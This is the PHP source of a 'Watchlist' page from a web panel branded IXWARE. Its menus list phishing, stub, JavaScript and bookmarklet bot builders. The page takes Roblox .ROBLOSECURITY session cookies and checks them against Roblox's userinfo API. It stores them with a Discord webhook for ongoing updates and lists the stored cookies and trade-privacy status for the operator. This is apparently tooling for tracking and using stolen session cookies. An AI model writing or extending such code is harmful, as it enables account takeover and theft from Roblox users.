<?php 
      @session_start();
      $title = 'Watchlist';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';
       
      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if($getRank != "Premium"){
        if($getRank != "Admin"){
          header('Location: dashboard');
          die();
        }
      }

      if($discordID == 0){
        header('Location: settings.php?id');
        die();
      }

      if (isset($_POST['submitWatchlist'])){

        if (!empty($_POST['submitWatchlist'])){
    
          if(!empty($_POST['watchlistCookie'])){

            if(!empty($_POST['watchlistWebhook'])){

                if (\Volnix\CSRF\CSRF::validate($_POST)) {
    
                    $cookie = htmlspecialchars($_POST['watchlistCookie']);
                    $webhook = htmlspecialchars($_POST['watchlistWebhook']);

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        'Cookie: .ROBLOSECURITY=' . $cookie
                    ));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $profile = json_decode(curl_exec($ch), 1);
                    $check = json_encode($profile);
                    curl_close($ch);
        
                    if(strpos($check, "UserID") == true){

                        if(checkWatchlist(htmlspecialchars($profile["UserID"])) != 1){
        
                            $PDOLog = $db -> prepare('INSERT INTO `cookie_watchlist` VALUES(:id, :webhook, :cookie_id, :cookie_name, :cookie, 0, :watchlist_id, :last_update, :date)');
                            $PDOLog -> execute(array(':id' => htmlspecialchars($_SESSION['ID']), ':webhook' => $webhook, ':cookie_id' => htmlspecialchars($profile["UserID"]), ':cookie_name' => htmlspecialchars($profile["UserName"]), ':cookie' => $cookie, ':watchlist_id' => getID(50), ':last_update' => date("Y-m-d H:i:s"), ':date' => date("Y-m-d H:i:s")));
            
                            $success = "Successfully added the cookie to the watchlist. You will receive updates on-site and via. your discord webhook.";
                        }else{
                            $error = "Cookie is already on the watchlist.";
                        }
                    }else{
                        $error = "Invalid Cookie.";
                    }
                  }else{
                    header("HTTP/1.1 401 Unauthorized");
                    echo file_get_contents('includes/layout/error/401.php');
                    die();
                  }
            }else{
                $error = "Please provide a discord webhook.";
            }
          }else{
              $error = "Please provide a roblox cookie.";
          }
        }
      }
      if (isset($_POST['addWatchlist'])){

        if (!empty($_POST['addWatchlist'])){
    
          if (\Volnix\CSRF\CSRF::validate($_POST)) {
    
            echo "<div class='modal fade' id='showPW' tabindex='-1' role='dialog' aria-hidden='true'>
            <div class='modal-dialog modal-lg' role='document'>
              <div class='modal-content'>
                <div class='modal-header bg-dark text-darkwhite'>
                  <h5 class='modal-title w-100 modaltext'>Add cookie to the watchlist</h5>
                  <button type='button' class='close text-white' data-dismiss='modal' aria-label='Close'><span aria-hidden='true'>×</span></button>
                </div>
                <div class='modal-body bg-dark text-darkwhite'>
                  <form method='POST'>
                    <div class='md-form mt-0'>
                      <input type='text' placeholder='Cookie' name='watchlistCookie' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                      <input type='text' placeholder='Discord Webhook' name='watchlistWebhook' class='form-control text-darkwhite mt-2' style='background-color: transparent !important;'>
                      <input type='hidden' name='" . \Volnix\CSRF\CSRF::TOKEN_NAME . "' value='" . \Volnix\CSRF\CSRF::getToken() . "'/>
                    </div>
                    <button type='submit' name='submitWatchlist' value='watchlist' class='btn btn-outline-primary waves-effect mt-3 center-button settings-button' style='width: 100%;'>Submit</button>
                  </form>
                </div>
              </div>
            </div>
          </div>"; 
          }else{
            header("HTTP/1.1 401 Unauthorized");
            echo file_get_contents('includes/layout/error/401.php');
            die();
          }
        }
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" style="width: 170px;" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>      
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link active' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Watchlist</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->

  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
          <div class="col-xl-8">
            <?php
              if(!empty($error)){
                  echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
              }
              if(!empty($success)){
                  echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
              }
            ?>
          </div>
        </div>
        <div class="row">
            <div class="col-xl-12">
                <div class="card bg-dark table" style="display:table;">
                  <div class="card-body d-flex flex-column">
                        <div style="display: inline-block;">
                          <form method="POST">
                            <button title="Add to watchlist" type="submit" name="addWatchlist" value="watchlist" style="border: none; outline: none; background: none; cursor: pointer; color: #fff; text-decoration: underline; font-family: inherit; font-size: inherit;"><i class='fas fa-plus-square fa-lg text-white float-left'></i></button>
                            <input type="hidden" name="<?= \Volnix\CSRF\CSRF::TOKEN_NAME ?>" value="<?= \Volnix\CSRF\CSRF::getToken() ?>"/>
                          </form> 
                        </div> 
                          <?php
                              $get = pdoQuery($db, "SELECT * FROM `cookie_watchlist` WHERE `id`=? order by `date` desc", [htmlspecialchars($_SESSION['ID'])]);
                              $results = $get->fetchAll(PDO::FETCH_ASSOC);
                              $row = $get->rowCount();

                              echo "<div class='table-responsive'>";
                                  echo "<table id='table-dataTable-watchlist' class='table table-hover text-darkwhite'>";
                                      echo "<thead class='text-nowrap'>
                                      <tr>
                                      <th scope='col' class='font-weight-bolder'>Cookie Name</th>
                                      <th scope='col' class='font-weight-bolder'>Cookie</th>
                                      <th scope='col' class='font-weight-bolder'>Trade Privacy</th>
                                      <th scope='col' class='font-weight-bolder'>Last Update</th>
                                      <th scope='col' class='font-weight-bolder'>Date</th>
                                      </tr>
                                      </thead>
                                      <tbody>";
                                      foreach($results as $result){
                                        $name = htmlspecialchars($result['cookie_name']);
                                        $cookie = htmlspecialchars($result['cookie']);
                                        $trades = htmlspecialchars($result['trades']);
                                        $last = htmlspecialchars($result['last_update']);
                                        $date = htmlspecialchars($result['date']);

                                        echo "<tr>
                                        <td scope=\"row\" style='word-break:break-all;'>$name</td>
                                        <td scope=\"row\" style='word-break:break-all;'>$cookie</td>
                                        <td scope=\"row\" style='word-break:break-all;'>$trades</td>
                                        <td scope=\"row\" style='word-break:break-all;'>$last</td>
                                        <td scope=\"row\" style='word-break:break-all;'>$date</td>
                                        </tr>";
                                    }
                                  echo "</tbody></table>";
                          ?>
                  </div>
                </div>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->

<!-- Central Modal Small -->
<div class="modal fade" id="view-modal" tabdashboard="-1" role="dialog" aria-labelledby="myModalLabel"
  aria-hidden="true">

  <!-- Change class .modal-sm to change the size of the modal -->
  <div class="modal-dialog modal-lg" role="document">


    <div class="modal-content">
      <div class="modal-header bg-dark text-darkwhite">
        <h5 class="modal-title w-100" id="myModalLabel">User Info</h5>
        <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close" id="modalButton">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body bg-dark text-darkwhite">
        <div id="modal-loader" style="display: none; text-align: center;"></div>
                            
           <!-- mysql data will be load here -->                          
           <div id="dynamic-content"></div>
      </div>
    </div>
  </div>
</div>
<!-- Central Modal Small -->

  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>